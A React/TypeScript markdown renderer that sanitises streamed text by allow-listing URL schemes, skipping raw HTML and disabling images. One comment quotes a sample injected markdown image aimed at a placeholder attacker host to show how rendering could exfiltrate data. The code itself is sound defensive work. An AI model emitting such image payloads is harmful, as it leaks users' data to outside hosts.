import { memo, useMemo } from 'react'
import ReactMarkdown, { type Components } from 'react-markdown'
import remarkGfm from 'remark-gfm'
import { cn } from '@/lib/cn'
import { CitationChip } from './citations'
import { remarkCite } from './remarkCite'

import { splitBlocks } from './StreamingMarkdown'

const SAFE_URL = /^(https:|mailto:|#|\/)/i

const components: Components = {
  a: ({ href, children }) => (
    <a href={href && SAFE_URL.test(href) ? href : undefined} target="_blank" rel="noopener noreferrer">{children}</a>
  ),
  // Images are disabled outright: an injected ![](https://attacker/?q=…) would exfiltrate on render.
  img: () => null,
  'cite-chip': ({ handle }: { handle?: string }) => (handle ? <CitationChip handle={handle} /> : null),
} as Components

const Block = memo(function Block({ text }: { text: string }) {
  return (
    <ReactMarkdown remarkPlugins={[remarkGfm, remarkCite]} skipHtml components={components} urlTransform={(u) => (SAFE_URL.test(u) ? u : '')}>
      {text}
    </ReactMarkdown>
  )
})

export default function MarkdownImpl({ text, streaming = false, className }: { text: string; streaming?: boolean; className?: string }) {
  const blocks = useMemo(() => splitBlocks(text), [text])
  return (
    <div className={cn('prose-lit', className)}>
      {blocks.map((b, i) => <Block key={i} text={b} />)}
      {streaming && <span aria-hidden className="ml-0.5 inline-block h-[1.05em] w-[2px] translate-y-[3px] animate-caret bg-ink" />}
    </div>
  )
}
